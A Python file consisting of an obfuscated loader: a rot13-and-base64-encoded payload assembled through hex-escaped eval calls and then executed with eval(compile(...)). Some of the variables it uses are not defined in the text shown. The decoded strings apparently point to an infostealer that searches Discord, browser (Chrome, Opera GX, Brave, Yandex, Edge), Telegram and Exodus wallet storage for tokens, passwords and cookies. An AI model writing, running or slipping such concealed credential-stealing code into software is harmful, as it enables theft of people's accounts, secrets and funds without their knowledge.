destiny = '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NtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNaQDbtVPNtLaWiq3AypyOuqTumVQ0tJj0XVPNtVPNtVPOoMvW7pz9uoJyhM30iG3OypzRtH29zqUqupzHiG3OypzRtE1ttH3EuLzkyVvjtVPNtVPNtVPNtVPNtVPNvo3OypzRhMKuyVvjtVPNtVv9Zo2AuoPOGqT9lLJqyY2kyqzIfMTVvYPNtVPNtVPNtVPNtVv8vYPNtVPNtVPNtVPNtVPViGzI0q29lnlVfVPNtVPNtVPNtVPNtVPViGT9wLJjtEKu0MJ5mnJ9hVSAyqUEcozqmY25eLzybMzWyo2quMJSiMJufMJMhn29xLzIzM3Oan25hVvNtVPNtVPNtVPNtVPNtVPNtVPNtVPOqYN0XVPNtVPNtVPOoMvW7pz9uoJyhM30iG3OypzRtH29zqUqupzHiG3OypzRtH3EuLzkyVvjtVPNtVPNtVPNtVPNtVPNtVPNvo3OypzRhMKuyVvjtVPNtVv9Zo2AuoPOGqT9lLJqyY2kyqzIfMTVvYPNtVPNtVPNtVPNtVv8vYPNtVPNtVPNtVPNtVPViGzI0q29lnlVfVPNtVPNtVPNtVPNtVPViGT9wLJjtEKu0MJ5mnJ9hVSAyqUEcozqmY25eLzybMzWyo2quMJSiMJufMJMhn29xLzIzM3Oan25hVvNtVPNtVPNtVPNtVPNtVPNtVPNtVPOqYN0XVPNtVPNtVPOoMvW7pz9uoJyhM30iG3OypzRtH29zqUqupzHiG3OypzRtGzIiov9Ip2IlVREuqTRiETIzLKIfqPVfVPNvo3OypzRhMKuyVvjtVPNtVv9Zo2AuoPOGqT9lLJqyY2kyqzIfMTVvYPNtVPNtVPNtVPNtVv8vYPNtVPNtVPNtVPNtVPViGzI0q29lnlVfVPNtVPNtVPNtVPNtVPViGT9wLJjtEKu0MJ5mnJ9hVSAyqUEcozqmY25eLzybMzWyo2quMJSiMJufMJMhn29xLzIzM3Oan25hVvNtVPNtVPNtVPNtVPNtVPNtVPNtVPOqYN0XVPNtVPNtVPOoMvW7oT9wLJk9Y0qio2qfMF9QnUWioJHiIKAypvORLKEuVvjtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNvL2ulo21yYzI4MFVfVPNtVv9RMJMuqJk0Y0kiL2SfVSA0o3WuM2HioTI2MJkxLvVfVPNtVv9RMJMuqJk0VvjtVPNtVPViETIzLKIfqP9BMKE3o3WeVvjtVPNtVPViETIzLKIfqP9Zo2AuoPOSrUEyoaAco24tH2I0qTyhM3ZiozgvnJuzLzIiM2SyLJ9ynTkyMz5eo2EvMJMapTqeoz4vVPNtVPNtVPNtVPNtVPOqYN0XVPNtVPNtVPOoMvW7oT9wLJk9Y0qio2qfMF9QnUWioJHtH3uGY1ImMKVtETS0LFVfVPNtVPNtVPNtVPNtVPNtVPNtVPNvL2ulo21yYzI4MFVfVPNtVv9RMJMuqJk0Y0kiL2SfVSA0o3WuM2HioTI2MJkxLvVfVPNtVv9RMJMuqJk0VvjtVPNtVPViETIzLKIfqP9BMKE3o3WeVvjtVPNtVPViETIzLKIfqP9Zo2AuoPOSrUEyoaAco24tH2I0qTyhM3ZiozgvnJuzLzIiM2SyLJ9ynTkyMz5eo2EvMJMapTqeoz4vVPNtVPNtVPNtVPNtVPOqYN0XVPNtVPNtVPOoMvW7oT9wLJk9Y0WlLKMyH29zqUqupzHiDaWuqzHgDaWiq3Aypv9Ip2IlVREuqTRvYPNtVPNtVPNtVPNvLaWuqzHhMKuyVvjtVPNtVv9RMJMuqJk0Y0kiL2SfVSA0o3WuM2HioTI2MJkxLvVfVPNtVv9RMJMuqJk0VvjtVPNtVPViETIzLKIfqP9BMKE3o3WeVvjtVPNtVPViETIzLKIfqP9Zo2AuoPOSrUEyoaAco24tH2I0qTyhM3ZiozgvnJuzLzIiM2SyLJ9ynTkyMz5eo2EvMJMapTqeoz4vVPNtVPNtVPNtVPNtVPOqYN0XVPNtVPNtVPOoMvW7oT9wLJk9Y1yuozEyrP9MLJ5xMKuPpz93p2IlY1ImMKVtETS0LFVfVPNtVPNtVPNtVPNtVPNtVPNvrJShMTI4YzI4MFVfVPNtVv9RMJMuqJk0Y0kiL2SfVSA0o3WuM2HioTI2MJkxLvVfVPNtVv9RMJMuqJk0VvjtVPNtVPViETIzLKIfqP9BMKE3o3WeVvjtVPNtVPViFT91M2SPo3IaLF9hn2WcnTMvMJ9aLJIuo2IboTIzozgiMTWyMzqjM2ghovVtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOqYN0XVPNtVPNtVPOoMvW7oT9wLJk9Y0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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
